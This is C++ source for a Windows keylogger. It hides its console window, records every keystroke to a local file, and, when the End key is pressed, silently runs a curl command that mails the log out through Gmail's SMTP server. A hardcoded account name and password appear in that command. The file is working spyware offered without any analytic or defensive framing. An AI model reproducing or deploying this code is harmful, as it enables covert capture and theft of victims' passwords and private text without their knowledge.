#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>
int Save (int ks, char *file);
void Stealth();
int main ()
{
Stealth ();
char i;
while (1)
{
for(i = 8; i <= 190; i++)
{
if (GetAsyncKeyState(i) == -32767)
Save
(i,"LOGGING.TXT");
}
}
system ("PAUSE");
return 0;
}
int Save (int ks, char *file)
{
if ( (ks == 1) || (ks == 2) )
return 0;
FILE *OUTPUT_FILE;
OUTPUT_FILE = fopen(file, "a+");
cout << ks << endl;
if (ks == 8)
fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
else if (ks == 13)
fprintf(OUTPUT_FILE, "%s", "\n");
else if (ks == 32)
fprintf(OUTPUT_FILE, "%s", " ");
else if (ks == VK_TAB)
fprintf(OUTPUT_FILE, "%s", "[TAB]");
else if (ks == VK_SHIFT)
fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
else if (ks == VK_ESCAPE)
fprintf(OUTPUT_FILE, "%s", "[ESC]");
else if (ks == VK_END)
{
fprintf(OUTPUT_FILE, "%s", "[END]");
fclose(OUTPUT_FILE);
char*
command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"athiru512@gmail.com\" --mail-rcpt\"athiru512@gmail.com\" --ssl -u athiru512@gmail.com:fantasticfour -T\"LOGGING.TXT\" -k --anyauth";
WinExec(command, SW_HIDE);
}
else if (ks == VK_HOME)
fprintf(OUTPUT_FILE, "%s", "[HOME]");
else if (ks == VK_LEFT)
fprintf(OUTPUT_FILE, "%s", "[<]");
else if (ks == VK_UP)
fprintf(OUTPUT_FILE, "%s", "[^]");
else if (ks == VK_RIGHT)
fprintf(OUTPUT_FILE, "%s", "[>]");
else if (ks == VK_DOWN)
fprintf(OUTPUT_FILE, "%s", "[v]");
else if (ks == VK_CONTROL)
fprintf(OUTPUT_FILE, "%s", "[Ctrl]");
else if (ks == VK_DELETE)
fprintf(OUTPUT_FILE, "%s", "[Del]");
else if (ks == 190 || ks == 110)
fprintf(OUTPUT_FILE, "%s", ".");
else
fprintf(OUTPUT_FILE, "%s", & ks);
fclose(OUTPUT_FILE);
return 0;
}
void Stealth()
{
HWND stealth;
AllocConsole();
stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(stealth,0);
}